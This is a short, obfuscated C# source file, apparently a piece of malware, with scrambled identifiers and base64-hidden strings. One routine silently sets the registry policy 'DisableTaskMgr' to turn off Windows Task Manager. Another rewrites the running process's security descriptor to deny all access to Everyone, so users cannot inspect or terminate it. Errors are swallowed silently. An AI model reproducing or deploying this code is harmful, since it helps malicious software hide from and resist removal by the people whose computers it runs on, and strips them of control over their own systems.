using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace OeQGwjtftIBDg;

internal sealed class vcmdlkNQFdyWsk
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr jrVYRwOKspIq, int LDKFJIkICqbzDe, [Out] byte[] aAZySzLLwAbs, uint RfggENJmsbrKEK, out uint oSrXXYYdfvqWzN);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr kuLpXYnYCVjS, int rFbjnwKmBW, [In] byte[] eRwqBKlvCZtvH);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void eIpPxhMbeGsMBm(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(jSdbwwLMlbK.aOUUGKAtMbj("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(jSdbwwLMlbK.aOUUGKAtMbj("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor UkpftKERraRZbZgc(IntPtr intptr_0)
	{
		byte[] aAZySzLLwAbs = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, aAZySzLLwAbs, 0u, out var oSrXXYYdfvqWzN);
		if ((long)oSrXXYYdfvqWzN > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, aAZySzLLwAbs = new byte[oSrXXYYdfvqWzN], oSrXXYYdfvqWzN, out oSrXXYYdfvqWzN))
		{
			return null;
		}
		return new RawSecurityDescriptor(aAZySzLLwAbs, 0);
	}

	private void tWCxzvkYCzQy(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void etOeIuDqomYp()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = UkpftKERraRZbZgc(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			tWCxzvkYCzQy(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
